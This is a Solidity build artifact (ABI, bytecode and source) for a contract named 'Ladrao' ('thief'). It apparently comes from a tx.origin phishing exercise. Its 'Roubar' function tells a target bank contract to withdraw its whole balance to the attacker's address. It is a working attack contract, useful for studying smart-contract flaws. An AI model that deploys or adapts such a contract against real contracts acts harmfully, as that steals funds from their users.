{
  "contractName": "Ladrao",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_endereco_alvo",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "Depositar",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "Roubar",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104e53803806104e58339818101604052810190610032919061011c565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b61038d806101586000396000f3fe6080604052600436106100345760003560e01c806344b7f7bd146100395780636615d65b146100435780638da5cb5b1461005a575b600080fd5b610041610085565b005b34801561004f57600080fd5b50610058610109565b005b34801561006657600080fd5b5061006f610236565b60405161007c919061029b565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166344b7f7bd6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100ef57600080fd5b505af1158015610103573d6000803e3d6000fd5b50505050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631111561023457600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a39d714460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b815260040161020192919061032e565b600060405180830381600087803b15801561021b57600080fd5b505af115801561022f573d6000803e3d6000fd5b505050505b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102858261025a565b9050919050565b6102958161027a565b82525050565b60006020820190506102b0600083018461028c565b92915050565b6000819050919050565b60006102db6102d66102d18461025a565b6102b6565b61025a565b9050919050565b60006102ed826102c0565b9050919050565b60006102ff826102e2565b9050919050565b61030f816102f4565b82525050565b6000819050919050565b61032881610315565b82525050565b60006040820190506103436000830185610306565b610350602083018461031f565b939250505056fea264697066735822122052fc1fbbc0652b9c1a7c23911ab14af8521c90b43b92ad07d39fcebc60a4ffdd64736f6c63430008110033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\ninterface Banco_interface {\n    function Sacar(address _to, uint256 _amount) external;\n\n    function Depositar() external payable;\n}\n\ncontract Ladrao {\n    address payable public owner;\n\n    Banco_interface banco;\n\n    constructor(address _endereco_alvo) {\n        banco = Banco_interface(_endereco_alvo);\n        owner = payable(msg.sender);\n    }\n\n    function Depositar() public payable {\n        return banco.Depositar();\n    }\n\n    function Roubar() public {\n        if (address(banco).balance > 0) {\n            banco.Sacar(owner, address(banco).balance);\n        }\n    }\n}\n",
  "sourcePath": "/home/mont/Desktop/phising/contracts/Ladrao.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2022-09-27T17:31:36.819Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}